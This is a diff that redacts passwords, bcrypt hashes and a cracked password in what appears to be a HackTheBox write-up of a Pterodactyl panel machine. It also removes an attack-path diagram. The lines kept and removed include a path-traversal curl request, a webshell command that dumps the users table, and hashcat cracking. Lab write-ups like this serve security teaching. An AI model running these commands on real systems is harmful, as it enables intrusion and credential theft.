@@ -15,7 +15,6 @@ tags: ["linux", "web", "pterodactyl-panel", "cve-2025-49132", "path-traversal", 
 
 ## Overview
 
-**Platform:** HackTheBox
 **Difficulty:** Medium
 **IP:** 10.129.x.x
 
@@ -47,36 +46,6 @@ The engagement identified critical vulnerabilities:
 - **CVE-2025-6019** - udisks XFS mount race condition creates SUID bash for root
 
 **Risk Rating:** Critical
-
----
-
-## Attack Path Overview
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│     CVE-2025-49132 → Path Traversal → DB Config Leak            │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     pearcmd.php LFI → config-create → Webshell as wwwrun        │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     MariaDB Dump → Bcrypt Hash → Crack → su to phileasfogg3     │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     CVE-2025-6018 → PAM Env Poisoning → allow_active Session    │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     CVE-2025-6019 → udisks XFS Mount → SUID Bash → Root         │
-└─────────────────────────────────────────────────────────────────┘
-```
 
 ---
 
@@ -162,7 +131,7 @@ curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterod
       "port": "3306",
       "database": "panel",
       "username": "pterodactyl",
-      "password": "PteraPanel"
+      "password": "[REDACTED]"
     }
   }
 }
@@ -239,7 +208,7 @@ DB_HOST=127.0.0.1
 DB_PORT=3306
 DB_DATABASE=panel
 DB_USERNAME=pterodactyl
-DB_PASSWORD=PteraPanel
+DB_PASSWORD=[REDACTED]
 ```
 
 ## 3.2 Dump User Hashes
@@ -248,12 +217,12 @@ MariaDB requires the `-h 127.0.0.1` flag to connect via TCP (socket auth is deni
 
 ```bash
 curl -sG "http://panel.pterodactyl.htb/x.php" \
-  --data-urlencode 'c=/usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -pPteraPanel --batch --skip-column-names -e "SELECT id,username,email,root_admin,password FROM panel.users"'
+  --data-urlencode 'c=/usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p[REDACTED] --batch --skip-column-names -e "SELECT id,username,email,root_admin,password FROM panel.users"'
 ```
 
 ```
-2  headmonitor   headmonitor@pterodactyl.htb   1  $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
-3  phileasfogg3  phileasfogg3@pterodactyl.htb  0  $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
+2  headmonitor   headmonitor@pterodactyl.htb   1  [HASH REDACTED]
+3  phileasfogg3  phileasfogg3@pterodactyl.htb  0  [HASH REDACTED]
 ```
 
 ## 3.3 Crack the Bcrypt Hash
@@ -263,14 +232,14 @@ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
 ```
-$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
+[HASH REDACTED]:[REDACTED]
 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
 ```
 
-**Cracked:** `phileasfogg3 : !QAZ2wsx`
+**Cracked:** `phileasfogg3 : [REDACTED]`
 
 ## 3.4 Pivot to phileasfogg3
 
@@ -441,11 +410,11 @@ bash-5.3# cat /root/root.txt
 ```
 Phase 2 - Initial Access (wwwrun)
 ────────────────────────────────────────────────────────────────
-pterodactyl     : PteraPanel          → .env / DB config leak
+pterodactyl     : [REDACTED]          → .env / DB config leak
 
 Phase 3 - Lateral Movement (phileasfogg3)
 ────────────────────────────────────────────────────────────────
-phileasfogg3    : !QAZ2wsx            → Bcrypt hash crack (rockyou)
+phileasfogg3    : [REDACTED]            → Bcrypt hash crack (rockyou)
 
 Phase 4 - Privilege Escalation (root)
 ────────────────────────────────────────────────────────────────
